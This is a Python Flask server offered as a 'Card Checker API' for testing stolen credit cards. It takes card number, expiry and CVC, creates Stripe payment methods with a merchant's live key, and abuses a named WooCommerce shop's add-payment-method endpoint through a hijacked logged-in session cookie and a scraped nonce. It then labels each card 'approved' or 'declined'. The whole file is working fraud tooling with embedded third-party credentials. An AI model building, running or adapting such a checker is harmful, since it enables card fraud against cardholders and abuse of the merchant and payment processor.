from flask import Flask, request, jsonify
import time
import requests
import json
import os
import re

app = Flask(__name__)

API_KEY = "OnyxEnv"

def process_card(ccx):
    try:
        # Parse card details
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return {
                "card": ccx,
                "response": "Invalid card format. Use: NUMBER|MM|YY|CVC",
                "status": "error"
            }
        
        n = parts[0].replace(" ", "")
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        full_card = f"{n}|{mm}|{yy}|{cvc}"
        
        # Step 1: Create payment method with Stripe
        data1 = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/f5ddf352d5; stripe-js-v3/f5ddf352d5; payment-element; deferred-intent',
            'referrer': 'https://hakfabrications.com',
            'client_attribution_metadata[client_session_id]': '34a36f85-07d8-4983-ae46-a9dc1edc455f',
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'guid': '2f6c56ae-bcbe-4539-b1e2-bddfc0588c067767c2',
            'muid': '47192fb7-80d2-44f0-af6e-d40688c4686a903c98',
            'sid': '9514e7dc-7ae3-4430-949a-72918f7125aec1dfe9',
            'key': 'pk_live_51PHFfEJakExu3YjjB9200dwvfPYV3nPS2INa1tXXtAbXzIl5ArrydXgPbd8vuOhNzCrq6TrNDL2nFGyZKD23gwQV00AS39rQEH',
            '_stripe_version': '2024-06-20',
        }

        headers1 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
        response_data = response1.json()
        
        # Check Stripe response for actual errors
        if 'error' in response_data:
            error_msg = response_data['error'].get('message', 'Card declined')
            return {
                "card": full_card,
                "response": error_msg,
                "status": "declined"
            }
            
        if 'id' not in response_data:
            return {
                "card": full_card,
                "response": "Your card was declined",
                "status": "declined"
            }
            
        payment_id = response_data['id']

        # Step 2: Get nonce from merchant site
        cookies0 = {
            '_ga': 'GA1.1.697081555.1747995052',
            'cookie_notice_accepted': 'true',
            '__stripe_mid': '47192fb7-80d2-44f0-af6e-d40688c4686a903c98',
            '__stripe_sid': '9514e7dc-7ae3-4430-949a-72918f7125aec1dfe9',
            'wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7': 'Yash-aka-ika-tika-pikachuuusus%7C1751098297%7Ceil8f2EBH2j61ba0GahItEmKNZR4Wf3iD6XxPR9Prx7%7C061900e08a858ebc58c99d373bb2d31af1d80ae521d014cc2417b1f05fc3c5f0',
        }

        headers0 = {
            'authority': 'hakfabrications.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://hakfabrications.com',
            'referer': 'https://hakfabrications.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        response0 = requests.get('https://hakfabrications.com/my-account/add-payment-method/', 
                              cookies=cookies0, headers=headers0)
        
        # Extract the nonce from the HTML response
        nonce_start = response0.text.find('"createAndConfirmSetupIntentNonce":"') + len('"createAndConfirmSetupIntentNonce":"')
        nonce_end = response0.text.find('"', nonce_start)
        nonce = response0.text[nonce_start:nonce_end]
        
        if not nonce:
            return {
                "card": full_card,
                "response": "Failed to extract nonce from page",
                "status": "error"
            }

        # Step 3: Create and confirm setup intent
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response = requests.post('https://hakfabrications.com/', 
                             params=params, cookies=cookies0, headers=headers0, data=data,
                             timeout=30)
        
        # Better response handling to avoid JSON errors
        result_text = response.text.strip()
        
        # Try to parse as JSON, if fails, analyze the text content
        try:
            result = json.loads(result_text)
        except json.JSONDecodeError:
            # If not JSON, analyze the text response
            result_text_lower = result_text.lower()
            
            # Check for success patterns in HTML/text response
            success_patterns = [
                'success',
                'succeeded', 
                'card_added',
                'payment_method',
                'setup_intent',
                'active'
            ]
            
            # Check for failure patterns
            failure_patterns = [
                'declined',
                'failed',
                'error',
                'invalid',
                'incorrect',
                'insufficient'
            ]
            
            if any(pattern in result_text_lower for pattern in success_patterns):
                return {
                    "card": full_card,
                    "response": "Card Added Successfully",
                    "status": "approved"
                }
            elif any(pattern in result_text_lower for pattern in failure_patterns):
                return {
                    "card": full_card,
                    "response": "Your card was declined",
                    "status": "declined"
                }
            else:
                # If we can't determine from text, check HTTP status and Stripe payment ID
                if response.status_code == 200 and payment_id:
                    return {
                        "card": full_card,
                        "response": "Card processing completed successfully",
                        "status": "approved"
                    }
                else:
                    return {
                        "card": full_card,
                        "response": "Card verification failed",
                        "status": "declined"
                    }
        
        # If we successfully parsed JSON, process normally
        if isinstance(result, dict):
            # Check for success in actual response
            if result.get('success') is True:
                return {
                    "card": full_card,
                    "response": "Card Added Successfully",
                    "status": "approved"
                }
            elif result.get('success') is False:
                error_message = result.get('data', {}).get('message', 'Card declined')
                return {
                    "card": full_card,
                    "response": error_message,
                    "status": "declined"
                }
        
        # Convert the entire response to string for pattern matching
        response_str = str(result).lower()
        
        # Real success indicators
        success_indicators = [
            'succeeded',
            'success',
            'active',
            'setup_intent',
            'payment_method'
        ]
        
        # Real decline indicators
        decline_indicators = [
            'declined',
            'failed',
            'error',
            'invalid',
            'incorrect',
            'insufficient',
            'expired'
        ]
        
        # Check for actual success indicators
        if any(indicator in response_str for indicator in success_indicators):
            return {
                "card": full_card,
                "response": "Card Added Successfully",
                "status": "approved"
            }
        # Check for actual decline indicators
        elif any(indicator in response_str for indicator in decline_indicators):
            return {
                "card": full_card,
                "response": "Your card was declined",
                "status": "declined"
            }
        else:
            # Final fallback - if we got a payment ID and 200 status, consider approved
            if payment_id and response.status_code == 200:
                return {
                    "card": full_card,
                    "response": "Card processing completed",
                    "status": "approved"
                }
            else:
                return {
                    "card": full_card,
                    "response": "Card verification failed",
                    "status": "declined"
                }
            
    except requests.exceptions.Timeout:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": "Request timeout - check manually",
            "status": "error"
        }
    except requests.exceptions.RequestException as e:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": f"Network error: {str(e)}",
            "status": "error"
        }
    except Exception as e:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": f"Processing error: {str(e)}",
            "status": "error"
        }

@app.route('/key=<key>/cc=<cc>')
def process_card_api(key, cc):
    if key != API_KEY:
        return jsonify({
            "error": "Invalid API key",
            "status": "error"
        }), 403
    
    result = process_card(cc)
    return jsonify(result)

@app.route('/')
def home():
    return jsonify({
        "message": "Card Checker API is running",
        "usage": "Use /key=OnyxEnv/cc=CARD_DETAILS to check cards",
        "format": "CARD_DETAILS format: NUMBER|MM|YY|CVC",
        "example": "/key=OnyxEnv/cc=4111111111111111|12|25|123",
        "note": "Enhanced response handling with better error management"
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
